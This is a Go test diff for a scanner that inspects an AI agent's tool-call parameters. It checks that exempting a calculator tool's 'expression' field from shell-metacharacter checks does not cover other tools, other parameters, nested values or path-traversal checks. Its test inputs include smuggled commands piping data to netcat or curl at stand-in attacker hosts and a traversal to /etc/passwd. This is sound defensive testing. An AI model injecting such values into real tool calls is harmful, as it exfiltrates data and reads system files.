@@ -200,6 +200,142 @@ func TestScan_NoCategoryFallsBackToJailbreakPattern(t *testing.T) {
 	}
 }
 
+func TestScan_ParamScanSkippedForToolParam(t *testing.T) {
+	cfg := defaultCfg()
+	cfg.ToolParamScanSkip = map[string]map[string][]string{
+		"calculator": {
+			"expression": {"shell_metacharacter"},
+		},
+	}
+	s := NewScanStage(cfg, nil)
+	rc := &riskcontext.RiskContext{
+		HookType: "on_tool_call",
+		Payload: map[string]any{
+			"name":   "calculator",
+			"params": map[string]any{"expression": "(5 > 3) && (2 < 4)"},
+		},
+	}
+	s.Run(rc)
+	for _, sig := range rc.Signals {
+		if sig.Category == "shell_metacharacter" {
+			t.Errorf("expected no shell_metacharacter signal for exempt tool, got %v", rc.Signals)
+		}
+	}
+}
+
+func TestScan_ParamScanAppliesToOtherTools(t *testing.T) {
+	cfg := defaultCfg()
+	cfg.ToolParamScanSkip = map[string]map[string][]string{
+		"calculator": {
+			"expression": {"shell_metacharacter"},
+		},
+	}
+	s := NewScanStage(cfg, nil)
+	rc := &riskcontext.RiskContext{
+		HookType: "on_tool_call",
+		Payload: map[string]any{
+			"name":   "search",
+			"params": map[string]any{"query": "data | nc attacker.com 4444"},
+		},
+	}
+	s.Run(rc)
+	found := false
+	for _, sig := range rc.Signals {
+		if sig.Category == "shell_metacharacter" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected shell_metacharacter signal for non-exempt tool, got %v", rc.Signals)
+	}
+}
+
+func TestScan_ParamScanSkipDoesNotCoverOtherParams(t *testing.T) {
+	cfg := defaultCfg()
+	cfg.ToolParamScanSkip = map[string]map[string][]string{
+		"calculator": {
+			"expression": {"shell_metacharacter"},
+		},
+	}
+	s := NewScanStage(cfg, nil)
+	rc := &riskcontext.RiskContext{
+		HookType: "on_tool_call",
+		Payload: map[string]any{
+			"name": "calculator",
+			"params": map[string]any{
+				"expression": "1 + 1",
+				"callback":   "x; curl attacker.example",
+			},
+		},
+	}
+	s.Run(rc)
+	found := false
+	for _, sig := range rc.Signals {
+		if sig.Category == "shell_metacharacter" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected shell_metacharacter signal for non-exempt calculator param, got %v", rc.Signals)
+	}
+}
+
+func TestScan_ParamScanSkipDoesNotCoverNestedValues(t *testing.T) {
+	cfg := defaultCfg()
+	cfg.ToolParamScanSkip = map[string]map[string][]string{
+		"calculator": {
+			"expression": {"shell_metacharacter"},
+		},
+	}
+	s := NewScanStage(cfg, nil)
+	rc := &riskcontext.RiskContext{
+		HookType: "on_tool_call",
+		Payload: map[string]any{
+			"name": "calculator",
+			"params": map[string]any{
+				"expression": map[string]any{"callback": "x; curl attacker.example"},
+			},
+		},
+	}
+	s.Run(rc)
+	found := false
+	for _, sig := range rc.Signals {
+		if sig.Category == "shell_metacharacter" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected shell_metacharacter signal for nested calculator value, got %v", rc.Signals)
+	}
+}
+
+func TestScan_SkipOnlyCoversListedCheck(t *testing.T) {
+	cfg := defaultCfg()
+	cfg.ToolParamScanSkip = map[string]map[string][]string{
+		"calculator": {
+			"expression": {"shell_metacharacter"},
+		},
+	}
+	s := NewScanStage(cfg, nil)
+	rc := &riskcontext.RiskContext{
+		HookType: "on_tool_call",
+		Payload: map[string]any{
+			"name":   "calculator",
+			"params": map[string]any{"expression": "../../../etc/passwd"},
+		},
+	}
+	s.Run(rc)
+	found := false
+	for _, sig := range rc.Signals {
+		if sig.Category == "path_traversal" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected path_traversal signal, skip list only covers shell_metacharacter, got %v", rc.Signals)
+	}
+}
+
 func TestScan_NormalisedPatternsMatch(t *testing.T) {
 	cases := []struct {
 		name    string
